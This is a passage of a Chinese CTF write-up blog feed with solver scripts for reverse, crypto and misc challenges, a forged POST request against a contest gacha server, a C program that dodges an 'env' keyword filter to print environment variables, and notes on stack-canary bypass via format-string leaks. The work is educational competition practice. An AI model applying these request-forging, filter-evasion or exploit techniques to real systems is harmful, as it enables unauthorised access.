class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t])</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, s_box, key</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(<span class="built_in">ord</span>(msg[k]) ^ s_box[t] ^ <span class="built_in">ord</span>(key[i]))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, s_box</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t] ^ i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;Please input your key:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(key) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;wrong!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&quot;Please input your msg:&quot;</span>)</span><br><span class="line">    box = init(key)</span><br><span class="line">    encode = encrypt(msg, box)</span><br><span class="line">    string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;YRiAOe4PlGvxaCoNj2ZgX+q8t/5Em6IUpM9FrVb7BKwsT1n3fSydhDWuQHJ0ckzL&#x27;</span></span><br><span class="line">    encode = b64encode(<span class="built_in">bytes</span>(encode)).decode().translate(<span class="built_in">str</span>.maketrans(string1, string2))</span><br><span class="line">    <span class="keyword">if</span> encode == <span class="string">&#x27;mWGFL24R/RSZY3pzK9H4FOmFOnXJKyCjXWbZ7Ijy11GbCBukDrjsiPPFiYB=&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congraduation!You get the right flag!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure><p>发现为了混淆写了几个没有用上的函数，这里<strong>只用到了check，init，enctypt这三个函数</strong></p><p>显然是一个RC4加密（变种，但是思路还是一样，加解密一样）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, msg</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[j], s_box[i] = s_box[i], s_box[j]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t] ^ i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;YRiAOe4PlGvxaCoNj2ZgX+q8t/5Em6IUpM9FrVb7BKwsT1n3fSydhDWuQHJ0ckzL&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;mWGFL24R/RSZY3pzK9H4FOmFOnXJKyCjXWbZ7Ijy11GbCBukDrjsiPPFiYB=&#x27;</span></span><br><span class="line">enc = b64decode(enc.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line">x = [<span class="number">78</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">121</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">126</span>, <span class="number">103</span>]</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    key.append(<span class="built_in">chr</span>(x[i] ^ i))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(key))</span><br><span class="line"></span><br><span class="line">flag = rc4(key, enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment"># NSSCTF&#123;eda20db6-3cff-6125-f6ca-1a155bd3292c&#125;</span></span><br></pre></td></tr></table></figure><h1 id="SekaiCTF"><a href="#SekaiCTF" class="headerlink" title="SekaiCTF"></a>SekaiCTF</h1><p>只看了一道re，<del>打nss去了</del></p><ul><li><em>re-Asusawa’a Gacha World(finish)</em></li></ul><h2 id="Re-Asusawa’a-Gacha-World"><a href="#Re-Asusawa’a-Gacha-World" class="headerlink" title="Re-Asusawa’a Gacha World"></a>Re-Asusawa’a Gacha World</h2><p>u3d逆向，先找Assembly CSharp.dll用dotpeek打开</p><p>在character里面找到flag，查看引用发现4星卡会有flag</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_4star.png" alt="4star" style="zoom:80%;"><p>然后继续找引用，发现抽卡不在本地，每次抽卡是要发送post请求，</p><p>所以思路就是伪造抽卡请求，然后抽到4星卡，获得flag。</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_post.png"><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://172.86.64.89:3000/gacha&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;SekaiCTF&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json = &#123;</span><br><span class="line">    <span class="string">&#x27;crystals&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">&#x27;numPulls&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;pulls&#x27;</span>: <span class="number">999999</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url, headers=headers, json=json)</span><br><span class="line">res = r.json()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>拿到一段base64，解码得到flag图片</p><p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_flag.png" alt="flag"></p>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NepCTF2023_WP</title>
      <link>http://hacbit.tech/NepCTF2023-WP/</link>
      <guid>http://hacbit.tech/NepCTF2023-WP/</guid>
      <pubDate>Sun, 13 Aug 2023 11:21:42 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;strong&gt;比赛详情：misc(7&amp;#x2F;9), pwn(1&amp;#x2F;9)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;已经从二进制手变成misc手了，悲&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/NepCTF2023-WP/image-20230813192419049.png&quot; alt=&quot;排名&quot;&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><strong>比赛详情：misc(7&#x2F;9), pwn(1&#x2F;9)</strong></p><p><del>已经从二进制手变成misc手了，悲</del></p><p><img src="/NepCTF2023-WP/image-20230813192419049.png" alt="排名"></p><span id="more"></span><h1 id="misc-codes"><a href="#misc-codes" class="headerlink" title="misc-codes"></a>misc-codes</h1><p>题目提示flag在环境变量内，所以本题目的是：编写能获取并输出环境变量的C语言代码。</p><p>经过不断试错，发现getenv（），main（int argc, char* args[], char* envp[])等常用的方法均不能通过。</p><p>所以合理推测是把env这个词ban了，把main第三个参数名envp改成e就可以输出了</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* args[], <span class="type">char</span>* e[])</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; e[i] != <span class="literal">NULL</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, e[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/NepCTF2023-WP/image-20230813193450003.png" alt="output" style="zoom:67%;"><h1 id="misc-与AI共舞的哈夫曼"><a href="#misc-与AI共舞的哈夫曼" class="headerlink" title="misc-与AI共舞的哈夫曼"></a>misc-与AI共舞的哈夫曼</h1><p>给了一个经过哈夫曼压缩算法压缩后的文件，直接用copilot生成解压代码了<del>(毕竟不是说与ai共舞嘛)</del></p><p>不过生成的有点问题，输出的解压文件是空的，手动改了一些</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read frequency information</span></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    num_of_freq = data[<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_of_freq):</span><br><span class="line">        byte = data[index]</span><br><span class="line">        freq = (data[index+<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (data[index+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (data[index+<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | data[index+<span class="number">4</span>]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        index += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read compressed data</span></span><br><span class="line">    padding = data[index]</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    dat = data[index:]</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> dat:</span><br><span class="line">        byte = <span class="built_in">bin</span>(byte)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        compressed_data += byte</span><br><span class="line"></span><br><span class="line">    <span class="comment">#compressed_data = compressed_data[:-padding]</span></span><br><span class="line"></span><br><span class="line">    node_now = root</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> compressed_data:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            node_now = node_now.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node_now = node_now.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> node_now.left <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> node_now.right <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            result += <span class="built_in">bytes</span>([node_now.char])</span><br><span class="line">            node_now = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br></pre></td></tr></table></figure><p><img src="/NepCTF2023-WP/image-20230813194208176.png" alt="huffman_decompressed"></p><p>虽然还是有点问题，不过已经不妨碍得到结果了（）</p><p>NepCTF{huffman_zip_666}</p><h1 id="misc-ConnectedFive"><a href="#misc-ConnectedFive" class="headerlink" title="misc-ConnectedFive"></a>misc-ConnectedFive</h1><p>万宁五子棋，不好评价（</p><p>直接玩过去就好了（）</p><p>（不想再玩一次了，就不放截图了吧，42次也太多了）</p><h1 id="misc-CheckIn"><a href="#misc-CheckIn" class="headerlink" title="misc-CheckIn"></a>misc-CheckIn</h1><p>签到，题目给了flag</p><p><img src="/NepCTF2023-WP/image-20230813204100990.png" alt="checkin"></p><h1 id="misc-陌生的语言"><a href="#misc-陌生的语言" class="headerlink" title="misc-陌生的语言"></a>misc-陌生的语言</h1><p>得到一个图片：</p><img src="/NepCTF2023-WP/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg" alt="陌生的纸条" style="zoom: 25%;"><p>提示了题目中A同学是Atsuko Kagari，查了一下是《小魔女学园》的，显然图中的两种语言应该出自该作品。最后查找确定了上下分别是古代龙语和露娜文</p><p>在网上找到了对应的码表</p><p><img src="/NepCTF2023-WP/%E9%BE%99%E8%AF%AD.jpeg" alt="龙语"></p><img src="/NepCTF2023-WP/luna_alphabet.jpg" alt="luna_alphabet" style="zoom: 67%;"><p>分别得到了nepnep a believing，和heart is your magic</p><p>提示flag格式凭语法断句，然后大小写都试一下，得到flag是:</p><p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p><h1 id="misc-小叮弹钢琴"><a href="#misc-小叮弹钢琴" class="headerlink" title="misc-小叮弹钢琴"></a>misc-小叮弹钢琴</h1><p>得到一个piano.mid文件，听了一会，发现可能有摩斯密码</p><p>用Audacity打开：</p><img src="/NepCTF2023-WP/image-20230813195608858.png" alt="mose" style="zoom:80%;"><img src="/NepCTF2023-WP/image-20230813195622754.png" alt="xor_data" style="zoom:80%;"><p>发现一半是摩斯，另一半可以侧过来看是一个很大的16进制数，读出来结果如下：</p><p>-.–&#x2F;—&#x2F;..-&#x2F;…&#x2F;….&#x2F;—&#x2F;..-&#x2F;.-..&#x2F;-..&#x2F;..-&#x2F;…&#x2F;.&#x2F;-&#x2F;….&#x2F;..&#x2F;…&#x2F;-&#x2F;—&#x2F;-..-&#x2F;—&#x2F;.-.&#x2F;…&#x2F;—&#x2F;–&#x2F;.&#x2F;-&#x2F;….&#x2F;..&#x2F;-.&#x2F;–.</p><p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p><p>把摩斯密码解密得到YOU SHOULD USE THIS TO XOR SOMETHING</p><p>显然要用这段英文xor刚才的16进制数</p><p>发现这个16进制数有30字节，摩斯密码明文也是30个字符（不算空格）</p><p>所以逐项异或得到答案（这里大小写都试了，小写可以）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&#x27;</span></span><br><span class="line">xor = <span class="string">&#x27;youshouldusethistoxorsomething&#x27;</span></span><br><span class="line">xor_a = [<span class="built_in">int</span>(a[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_a)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor_a[i] ^ <span class="built_in">ord</span>(xor[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到 <code>NepCTF&#123;h4ppy_p14N0&#125;NepCTF&#123;h4pp</code></p><h1 id="misc-你也喜欢三月七么"><a href="#misc-你也喜欢三月七么" class="headerlink" title="misc-你也喜欢三月七么"></a>misc-你也喜欢三月七么</h1><p>得到的txt附件内容如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">salt<span class="emphasis">_lenth= 10 </span></span><br><span class="line"><span class="emphasis">key_</span>lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= </span><br><span class="line">b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>显然是一个AES加密，这里肯定要先解出salt和key</p><img src="/NepCTF2023-WP/image-20230813200653505.png" alt="image-20230813200653505" style="zoom:80%;"><p>没什么头绪，所以回去重新看题，发现了一些端倪：</p><ul><li>这群名看起来怪怪的，…，好咸诶 &#x3D;&gt; 推测出群名是盐，也就是salt&#x3D;NepCTF2023</li><li>这需要经过啥256处理一下才能得到解题的关键 &#x3D;&gt; 啥的拼音是sha，所以推测要把salt用sha256加密，得到关键（合理推测就是key了）</li></ul><p>得到sha256（salt）&#x3D; dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p><p>因为附件里说key是16位，所以试了一下截前16字节作为key来解aes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009&#x27;</span></span><br><span class="line">iv_hex = <span class="string">&#x27;88219bdee9c396eca3c637c0ea436058&#x27;</span> <span class="comment">#原始iv转hex的值</span></span><br><span class="line">ciphertext= <span class="string">&#x27;&#x27;&#x27;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把hex值转成bytes</span></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv_hex)</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plaintext = aes.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;plaintext:&#x27;</span>, plaintext)</span><br><span class="line"><span class="comment"># plaintext: b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27;</span></span><br></pre></td></tr></table></figure><p>得到的明文拿去解base16，然后再解base64得到</p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p>把图片下载下来：</p><img src="/NepCTF2023-WP/yOkXWSJT.png" alt="yOkXWSJT" style="zoom: 30%;"><p>又是一个奇怪的语言，想到本题背景是星穹铁道，所以去找了一下星铁的文字，发现图片里的应该是宇宙通用文</p><p>去wiki找到了码表:<br><img src="/NepCTF2023-WP/image-20230813202732539.png" alt="宇宙通用文" style="zoom: 67%;"></p><p>对照得到flag：</p><p>NepCTF{HRP_aIways_likes_March_7th}</p><h1 id="pwn-HRP-CHAT-3"><a href="#pwn-HRP-CHAT-3" class="headerlink" title="pwn-HRP-CHAT-3"></a>pwn-HRP-CHAT-3</h1><p>获取途径是进入Start，然后打败boss。</p><p>由于只能攻击一次，所以找一个攻击最高的（H3h3QAQ），保证能秒掉boss。</p><p>Shop里没有，只能抽卡（RollCard）</p><p>出来后直接去打Start就行，输入的下标在源码里找分别对应Characters和skill这两个数组的下标，所以注意自己的H3h3QAQ是哪个下标就行了</p><p><img src="/NepCTF2023-WP/image-20230813203835458.png" alt="image-20230813203835458"></p>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/NepCTF2023-WP/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Canary常见绕过思路</title>
      <link>http://hacbit.tech/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</link>
      <guid>http://hacbit.tech/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</guid>
      <pubDate>Tue, 01 Aug 2023 01:48:41 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;总览：&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基本leak&lt;/li&gt;
&lt;li&gt;fork子进程爆破&lt;/li&gt;
&lt;li&gt;打TLS&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><em><strong>总览：</strong></em></p><ul><li>基本leak</li><li>fork子进程爆破</li><li>打TLS</li></ul><span id="more"></span><h1 id="1、基本leak"><a href="#1、基本leak" class="headerlink" title="1、基本leak"></a>1、基本leak</h1><p>由于canary是以\x00结尾（正好截断字符），所以如果把\x00覆盖掉，就可以实现leak canary。</p>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NSSround14wp</title>
      <link>http://hacbit.tech/NSSround14wp/</link>
      <guid>http://hacbit.tech/NSSround14wp/</guid>
      <pubDate>Mon, 31 Jul 2023 01:33:17 GMT</pubDate>
      
      <description>&lt;p&gt;本次round14只打了一题，（没报零真是太好了），赛后在@摸鱼の猫 师傅的指点下又解决了一题&lt;/p&gt;
&lt;img src=&quot;/NSSround14wp/nssround14.png&quot; alt=&quot;round14&quot; style=&quot;zoom:50%;&quot;&gt;

&lt;p&gt;&lt;strong&gt;也许是目录&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;love&lt;/li&gt;
&lt;li&gt;xor&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>本次round14只打了一题，（没报零真是太好了），赛后在@摸鱼の猫 师傅的指点下又解决了一题</p><img src="/NSSround14wp/nssround14.png" alt="round14" style="zoom:50%;"><p><strong>也许是目录</strong></p><ul><li>love</li><li>xor</li></ul><span id="more"></span><h1 id="Love"><a href="#Love" class="headerlink" title="Love"></a>Love</h1><p><em><strong>PS: 做题都能看到Toka，我直接狂喜-ing</strong></em></p><p>👉 <a href="../resources/pwn_asset/NSS_round14/love.zip" target="_block">点击下载附件</a></p><img src="/NSSround14wp/loveMain.png" alt="loveMain" style="zoom:75%;"><p>发现main又格式化漏洞，程序开了canary保护</p><p>所以思路就是：<strong>利用printf改写v4使其等于v5，并且泄露canary</strong></p><img src="/NSSround14wp/lovevuln.png" alt="lovevuln" style="zoom:75%;"><p>然后进入vuln函数就是一个简单的溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 